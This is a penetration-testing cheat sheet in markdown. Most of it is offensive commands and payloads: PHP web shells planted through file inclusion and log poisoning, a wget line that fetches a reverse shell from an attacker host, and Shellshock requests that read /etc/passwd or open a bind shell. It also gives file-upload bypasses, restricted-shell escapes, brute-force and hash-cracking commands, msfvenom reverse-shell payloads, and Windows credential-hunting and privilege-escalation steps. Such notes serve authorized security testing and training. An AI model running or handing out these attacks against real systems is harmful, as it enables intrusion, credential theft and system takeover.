# Awesome Pentest Notes

***

Table of Contents
=================


 * [NMAP Scan](#-nmap-scan)
 * [Web App Scan](#-web-app-scan)
 * [Wordpress Attacks](#-Wordpress-Attacks)
 * [SQL Injection](#-SQL-Injection)
 * [RFI/LFI Technics](#-rfi-lfi)
 * [Shell Escaping](#-Shell-Escaping)
 * [Exploiting Shellshock](#-Exploiting-Shellshock)
 * [File Upload Bypass Technics](#-File-Upload-Bypass-Technics)
 * [Password Brute-forcing and Cracking](#-Password-Brute-forcing-and-Cracking)
 * [Metasploit Payloads](#-Metasploit-Payloads)
 * [Web Application Technics](#-Web-Application-Technics)
 * [Tcpdump](#-tcpdump)
 * [Windows Privileged Escalation Technics](#-Windows-Privileged-Escalation-Technics)
 

 ## [↑](#table-of-contents) NMAP Scan
 ```
 ```
 ## [↑](#table-of-contents) Web App Scan
 ```
 * Dirb
 >> Specifi file extention
 dirb http://10.10.10.56/cgi-bin -X .sh
 dirb http://$target /usr/share/wordlists/dirb/common.txt
 
 * Dirbuster
 dirbuster -u https://192.168.216.131 -H -v -l /usr/share/dirb/wordlists/common.txt

 ```
 ## [↑](#table-of-contents) Wordpress Attacks
 ```
 * WPScan
 wpscan –u http://derpnstink.local/weblog/ --enumerate t --enumerate u
 
 
 ```
 ## [↑](#table-of-contents) SQL Injection
 ```
 * SQLMAP Example - http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
 sqlmap -u 'http://helpdesk.test.lab/login.php' --data='username=username&password=password&submit=Enter' --level=5 --risk=3 --batch
sqlmap -u 'http://192.168.254.129:1337/978345210/index.php' --forms --level=5 --risk=3 --batch
 ```
 
  ## [↑](#table-of-contents) RFI/LFI Technics
  ### PROC Environment
  ```
  - /proc/self/environ 
  Inject HTTP_USER_AGENT as <?php system($_GET[‘cmd’]); ?> […]/fi/?page=/proc/self/environ&cmd=ls
  
  - /proc/self/fd 
  Inject HTTP_USER_AGENT as <?php system($_GET[‘cmd’]); ?> […]/fi/?page=/proc/self/fd&cmd=pwd
  ```
  
  ### PHP Wrapper
  ```
  - PHP://filter
  ?file=php://filter/read=convert.base64-encode/resource=../../config.php
  
  - Expect://
  ?page=expect://ls
  
  - Data://
  […]/fi/?page=data:text/plain,<?system($_GET['x']);?>&x=ls%00 […]/fi/?page=data:,<?system($_GET['cmd']);?>&x=ls%00 […]/fi/?page=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls%00
  
 
  ```
  ### PHP://input (POST method)
  ```
  - PHP://input (POST method)
  URL www.pentest.local/fileincl/vul.php?page=php://input 
  On Burp "Enable Post Data" <? system('wget http://kali/php-reverse-shell.php -O /var/www/shell.php')
  ```
  ### Log Poisoning to LFI
  ```
  - Inject PHP Shell to Apache log
  $ nc <target_ip> 80 GET /<?php system(&_GET['cmd']); ?> Browse to vulnerable page: […]/fi/?page=/var/log/apache.log&cmd=ls
  
  - Inject PHP Shell to Mail log
  $ mail -s "Hello: <?php system($_GET['cmd']); ?>" pentest@pentest.local < /dev/null 
  Browse to vulnerable page: […]/fi/?page=/var/log/mail.log&cmd=ls
  
  - Inject PHP Shell to SSH log
  $ ssh <? php system($_GET['cmd']);?>@<target_ip> Browse to vulnerable page: […]/fi/?page=/var/log/auth.log&cmd=ls
  ```
  ### Hiding PHP shell to an image and use for LFI
  ```
  Most of the time we cannot find anyway to upload .php directly to web server but if we can find the page that vulnerble for LFI then we can use the bypass method below to convert PHP shell to any images format and upload to the server and execute via LFI attack.


GIF : Add "GIF98a;" in the first line of the PHP shell then rename to shell.gif

GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>

JPG : cat orinal.jpg shell.php > shell.jpg

PNG  : cat orinal.png shell.php > shell.png

EXIF  : exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg
  ```
  
  ### Automatic Scaning tools
  ```
  - https://github.com/D35m0nd142/LFISuite
  - https://github.com/Hack-Hut/CrabStick
  ```
  
## [↑](#table-of-contents) Shell Escaping
### Using Text Editor
```
VI --> :!bash
VI --> :set shell=/bin/bash:shell

VIM-->  !/bin/sh or !/bin/bash or vim -c '!sh'

Pico --> pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T

Less --> less file then !sh

More --> more file then !sh
```
### Programing Languages Techniques
```
AWK --> awk 'BEGIN {system("/bin/bash")}'

Find --> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;

Perl --> perl -e 'exec "/bin/bash";'

Python --> python -c ‘import pty; pty.spawn(“/bin/sh”)’
Python --> python -c ‘import pty; pty.spawn(“/bin/bash”)’

EXCEPT --> except spawn sh then sh

PHP --> php - a then exec("sh -i");

LUA --> os.execute('/bin/sh')

Ruby --> exec "/bin/sh"
```
### SSH Techniques
```
ssh username@IP -t "/bin/sh" or "/bin/bash"
ssh username@IP -t "bash --noprofile"
ssh username@IP -t "() { :; }; /bin/bash"
```
### Using other software
```
FTP --> !/bin/sh or !/bin/bash
SCP --> -S /path/yourscript x y:

GDB --> !/bin/sh or !/bin/bash

GIT --> git help status > you can run it then !/bin/bash
ZIP --> zip /tmp/test.zip /tmp/test -T --unzip -command="sh -c /bin/bash"

TAR --> tar cf /dev/null testfile --checkpoint=1 --checkpoint -action=exec=/bin/bash

NMAP --> nmap --interactive then !sh

MAN --> man man then !sh
```

## [↑](#table-of-contents) Exploiting Shellshock
###  Exploiting CGI-BIN
```
git clone https://github.com/nccgroup/shocker

./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c

/cgi-bin/status --verbose


SSH Forced Command

Check for forced command by enabling all debug output with ssh

$ ssh -vvv

$ ssh -i noob noob@$ip '() { :;}; /bin/bash'


cat file (view file contents)

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {

:;}; echo \\$(</etc/passwd)\\r\\nHost:

vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80


Shell Shock run bind shell

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {

:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:

vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
```


## [↑](#table-of-contents) File Upload Bypass Technics
### Null Character
```
Upload file as shell.php%00.jpg or shell.php%00.png
```
### Double Extension injection
```
Upload file as shell.php.png

In Burp - Change filename='shell.php'
```
### Content Type Manipulation
```
In Burp - Change Content-Type: image/png
```
### File Extension Manipulation
```
Using capital letters like : file.aSp or file.PhP or file.PHp3 file.PhP5 or file.PhT

Using trailing spaces and/or dots at the end of the filename like : file.asp… … . . .. .. , file.asp , file.asp.

Using semicolon bypass like : file.asp;.jpg (Only in IIS 6 or prior)

Using forbidden extension like :  file.asp:.jpg or file.asp::$data
```

 ## [↑](#table-of-contents) Password Brute-forcing and Cracking
 ### Medusa
 ```
 Medusa, initiated against an htaccess protected web directory
$ medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10
 ```
 ### Hydra
 ```
 Brute-forcing against SNMP

$ hydra -P password-file.txt -v $ip snmp


Brute-forcing against FTP known user and password list

        $ hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp


SSH brute-forcing list of users and passwords

       $  hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh -s 22


POP3 Brute-forcing

$ hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V


SMTP Brute-forcing

$ hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V


Hydra attack http get 401 login with a dictionary

$ hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin


Brute-forcing Remote Desktop

$ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip


Brute-forcing  HTTP login (POST method)

$ hydra -t2 -e ns -L users.txt -P passwords.txt -f 192.168.11.223 http-post-form "login.php:username=^USER^&password=^PASS^&submit=Login:Incorrect" -V

$ hydra -t64 -e ns -l administrator -P passwords.txt -f 192.168.11.223 http-post-form "login.php:username=^USER^&password=^PASS^&submit=Login:Incorrect" -V


Brute-forcing WordPress login

$ hydra -l elliot -P ~/password.txt 192.168.1.1 http-post-form "/wp-login.php:log=elliot&pwd=^PASS^:ERROR -V"
 ```
 ### John the Ripper
 ```
- Cracking Hashes
$ echo "admin:$P$B9wJdX0OkO95U2L.kqAWQXsFufw2p5N1" > admin_pass.txt
$ john adminpass.txt --wordlist=rockyou.txx
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-here

- Cracking Linux password
$ unshadow passwd-file.txt shadow-file.txt
$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
$ john /tmp/crack.password.db
 ```
 ### Online Password Cracking site
 ```
 https://crackstation.net
 ```
 ### Ncrack
 ```
 - Brute-forcing RDP
$ ncrack -vv --user administrators -P password.txt rdp://$ip
 
 ```
 
 ### Hashcat
 
 ```
 $ echo "admin:$P$B9wJdX0OkO95U2L.kqAWQXsFufw2p5N1" > admin_pass.txt
 
 - Cracking Linux md5crypt passwords
 $ hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt

 - Cracking Wordpress passwords using rockyou:
 $ hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt
 ```
 
  ## [↑](#table-of-contents) Metasploit Payloads
 ### Web Based Payloads
 ```
PHP

msfvenom -p php/meterpreter/reverse_tcp lhost=<Your IP> lport=<Your Port> -f raw > rshell.php
ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f asp > rshell.asp
JSP

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw > rshell.jsp
WAR (Tomcat)

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f war > rshell.war


 ```
 
 ### Script Langauge payloads
 ```
Python

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP> LPORT=<Your Port> -f raw > rshell.py
Bash

msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP> LPORT=<Your Port> -f raw > rshell.sh
Perl

msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP> LPORT=<Your Port> -f raw > rshell.pl
 ```
 ### Shellcode
 ```
Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f <language>
Windows

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f <language>


 ```
 ### Binaries
 ```
Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f elf > rshell.elf
Mac

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f macho > rshell.macho
Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f exe > rshell.exe
 ```
 ### MSF Handlers
 ```
use exploit/multi/handler
set PAYLOAD <Payload name above>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
 ```
 
  ## [↑](#table-of-contents) Web Application Technics
 ```
1. Robots.txt

2. Source-code Review of Page

3. Common backup files

/index.php.bak
/index.asp.bak
/index.htm.bak
/index.html.bak
/install.bak
/config.bak
/config.php.bak

4. Shellshock?

nmap -sV -p- --script http-shellshock <target>
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>

5. HeartBleed?

nmap -sT -p 443 --script=ssl-heartbleed  <target>

6. Wordpress Scanning

$ wpscan –u http://pentest.local/weblog/ --enumerate t --enumerate u
$ wpscan –random-agnet -u http://pentest.local –proxy 127.0.0.1:8080
#Bruteforce WP login 
$ wpscan –url http://pentest.local/wp-admin –wordlist /usr/share/wordlists/rockyou.txt –username admin

Note : Dont trust WPScan result, always check againts Searchsploit for all plugins

7. Nikto

$ nikto -h http://www.pentest.local


8. Directory Bruteforcing using

$ dirbuster -u https://pentest.local -H -v -l /usr/share/dirb/wordlists/common.txt
$ dirb http://$pentest.local /usr/share/wordlists/dirbuster# directory-list-2.3-medium.txt -p $proxy-ip:3129
$ gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
$ nikto -h http://www.pentest.local
 ```

  ## [↑](#table-of-contents) Tcpdump
 ```
 Filter by destination IP and ports

$ tcpdump -n "dst host 192.168.1.1 and dst port 23"
$ tcpdump -n "dst host 192.168.1.1 and (dst port 23 or dst port 443)"
$ tcpdump -n "dst net 192.168.10/24 and dst port 23"
$ tcpdump -n "dst net 192.168.10/24 and dst portrange 1-23"


Filter by source IP and ports

$ tcpdump -n "src host 192.168.1.1 and src port 2222"
$ tcpdump -n "src host 192.168.1.1 and (src port 2222 or src port 2200)"
$ tcpdump -n "src net 192.168.1.0/24 and src port 2222"
$ tcpdump -n "src net 192.168.1.0/24 and src portrange 1-2222"


Capture only ICMP packets:

$ tcpdump -v icmp


Capture either ICMP or ARP packets:

$ tcpdump -v "icmp or arp"


Grab a packet capture on port 80 (HTTP) and write to pcap file

$ tcpdump tcp port 80 -w output.pcap -i eth0


Display a captured pcap file

$ tcpdump -r captured.pcap
 ```

 ## [↑](#table-of-contents) Windows Privileged Escalation Technics
 ### Basic Enumeration command
 ```
 net config Workstation

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

hostname

net users

ipconfig /all

route print

arp -A

netstat -ano

netsh firewall show state

netsh firewall show config

schtasks /query /fo LIST /v

tasklist /SVC

net start

DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s *pass* == *cred* == *vnc* == *.config*

findstr /si password *.xml *.ini *.txt

reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s
 ```
 ### Credential store in files
 ```
 
 ```
### Credential store in registry
 ```
 findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini

Credential store in DC Policy Script files (\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\)
 ```
 ### Cached credentials
 ```
 # VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s
 ```
 ### Token kidnapping (churrasco.exe)
 ```
 Churrasco (Windows XP SP0 - SP1, Server 2003) - https://www.exploit-db.com/exploits/6705/

churrasco.exe "net user admin01 admin01/add"

churrasco.exe "net localgroup administrators admin01/add"
 ```
 ### Domain Enumeration CMDs
 ```
 net user
net user dan
net group
net user /domain
net group /domain
net group /domain "Domain Admins"
net group /domain "Enterprise Admins"
query user
 ```
 ### Group Policy Preferences (GPP)
 ```
 Check the password hash on \\dc1\SYSVOL\Groups.xml

Decrypt the password as $gpp-decrypt hash
 ```
 ### Check on un-secured Schedule Tasks
 ```
 tasklist /SVC
 ```
 ### Metasploit (Rarely works)
 ```
 meterpreter > getsystem
 ```
 ### Finding vulnerable installed software
 ```
 CMD > wmic product get name,version
 PowerShell > Get-WmiObject Win32_Product | Sort-Objecct Name | Format-Table Name, Version, Vendor
 ```
 ### Unquoted Service Paths
 ```
 CMD > wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 ```
 ### Pass-The-Ticket
 ```
 https://pentestlab.blog/tag/kiwi/
 https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283
 https://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/
 https://adsecurity.org/?tag=goldenticket
 https://forensicmethods.com/wp-content/uploads/2014/07/PassTheGolden_Ticket_v1_0.pdf
 https://k4r4koyun.com/win/kerberos-silver-ticket-attacks-and-a-quick-look-at-the-golden-tickets/
 https://blog.stealthbits.com/?s=golden+ticket
 ```
 ### Pass-The-Hash
 ```
 $ meterpreter > load mimikatz
 $ pth-winexe -U Administrator%"hash:hash" //<target> cmd.exe
 ```
 ### Windows Exploit Suggester
 ```
 $ ./windows-exploit-suggester.py --update
 $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
 ```
 
